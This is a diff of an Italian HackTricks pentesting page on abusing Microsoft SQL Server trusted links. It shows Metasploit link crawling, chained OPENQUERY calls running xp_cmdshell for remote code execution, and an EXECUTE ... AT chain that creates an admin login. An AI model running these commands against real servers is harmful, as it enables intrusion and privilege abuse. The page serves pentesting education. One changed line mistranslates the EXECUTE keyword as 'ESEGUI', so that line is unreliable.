@@ -6,7 +6,7 @@
 
 * Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la **tua azienda pubblicizzata su HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
-* Ottieni il [**PEASS ufficiale & HackTricks swag**](https://peass.creator-spring.com)
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
@@ -15,7 +15,6 @@
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
-
 
 ## **Enumerazione / Scoperta MSSQL**
 
@@ -79,7 +78,7 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 ```
 ### Trucchi di Base per l'Hacking di MSSQL
 
-Verifica nella pagina menzionata nella **seguente sezione come fare questo manualmente.**
+Verifica nella pagina menzionata nella **sezione seguente come fare questo manualmente**.
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
@@ -125,7 +124,7 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 ```
 ### Metasploit
 
-È possibile controllare facilmente i link affidabili utilizzando Metasploit.
+È possibile controllare facilmente i collegamenti fidati utilizzando Metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
@@ -139,18 +138,18 @@ Da **Windows** potresti anche trovare i link ed eseguire comandi manualmente uti
 
 _Accedi utilizzando l'autenticazione di Windows:_
 
-![](<../../.gitbook/assets/image (805).png>) 
+![](<../../.gitbook/assets/image (808).png>) 
 
 #### Trova Collegamenti Affidabili
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
 ```
-![](<../../.gitbook/assets/image (713).png>)
+![](<../../.gitbook/assets/image (716).png>)
 
 #### Eseguire query in un link affidabile
 
-Eseguire query attraverso il link (esempio: trovare più link nella nuova istanza accessibile):
+Eseguire le query attraverso il link (esempio: trovare più link nella nuova istanza accessibile):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
@@ -158,7 +157,7 @@ select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 Controlla dove vengono utilizzati apici doppi e singoli, è importante usarli in quel modo.
 {% endhint %}
 
-![](<../../.gitbook/assets/image (640).png>)
+![](<../../.gitbook/assets/image (643).png>)
 
 Puoi continuare manualmente questa catena di collegamenti fidati all'infinito.
 ```sql
@@ -168,11 +167,9 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-Se non è possibile eseguire azioni come `exec xp_cmdshell` da `openquery()`, prova con il metodo `EXECUTE`.
+### Manuale - ESEGUI
 
-### Manuale - EXECUTE
-
-Puoi anche abusare dei link attendibili utilizzando `EXECUTE`:
+Puoi anche abusare dei link fidati utilizzando `ESEGUI`:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
@@ -186,17 +183,16 @@ Una strategia che molti autori hanno ideato è quella di forzare un servizio **S
 
 [SweetPotato](https://github.com/CCob/SweetPotato) ha una raccolta di queste varie tecniche che possono essere eseguite tramite il comando `execute-assembly` di Beacon.
 
-
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
 <details>
 
-<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 * Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione esclusiva di [**NFT**](https://opensea.io/collection/the-peass-family)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
